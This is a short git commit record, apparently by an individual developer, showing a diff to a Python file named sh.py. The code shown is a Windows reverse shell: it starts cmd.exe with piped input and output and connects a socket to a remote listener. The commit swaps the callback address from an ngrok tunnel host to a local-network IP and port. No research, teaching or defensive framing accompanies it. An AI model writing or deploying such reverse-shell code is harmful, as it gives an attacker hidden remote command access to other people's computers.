0b2368c69cff4da4857e1e32b9b981636f56c26e
Omar Samy <osamy7592@gmail.com>
2024-05-05 01:44:47 +0300

    Update sh.py

--- sh.py
+++ sh.py
@@ -7,7 +7,7 @@ import time
 def rev():
    p = sp.Popen(['cmd.exe'], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT)
    s = socket.socket()
-   s.connect(('0.tcp.eu.ngrok.io', 10751))
+   s.connect(('192.168.1.16', 4222))
 
    def s_o():
        while True:
